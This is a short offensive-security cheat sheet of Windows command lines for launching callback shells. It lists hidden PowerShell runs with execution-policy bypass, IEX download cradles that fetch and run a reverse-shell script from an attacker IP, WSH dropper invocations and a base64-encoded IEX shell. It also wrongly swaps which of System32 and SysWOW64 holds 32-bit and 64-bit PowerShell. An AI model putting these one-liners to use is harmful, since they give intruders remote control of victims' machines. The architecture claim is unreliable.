# Windows

## 01 - Command Prompt

### 1.1 - Basics

#### 1.1.1 - Callback Shell

- System32 is for 32-bit powershell payloads

`C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ex bypass -f file.ps1`

`C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f file.ps1`

`C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://<IP>/rev.ps1')"`

- SysWOW64 is for 64-bit powershell payloads

`C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f file.ps1`

#### 1.1.2 - WSH scripts droppers

- When deploying reverse shells as droppers or toolings with the following formats

`C:\> wscript.exe <script.js | script.vbs>`

`C:\> cscript.exe <script.js | script.vbs | script.cs>`

## 02 - Powershell

### 2.1 - Basics

`PS C:\> Get-Command <command>`

`PS C:\> Get-Command -Module <powershell_module>`

`PS C:\> IEX (iwr -UseBasicParsing http://<IP>/rev.ps1);`

### 2.2 - Base64

#### 2.2.1 - Callback Shell Connection

- Execute a callback shell

`PS C:\> IEX ([System.Text.Encoding]::Unicode.GetString(([convert]::FromBase64String('<base64_encoded>'))))`

## References

- [ss64.com Powershell](https://ss64.com/ps/powershell.html)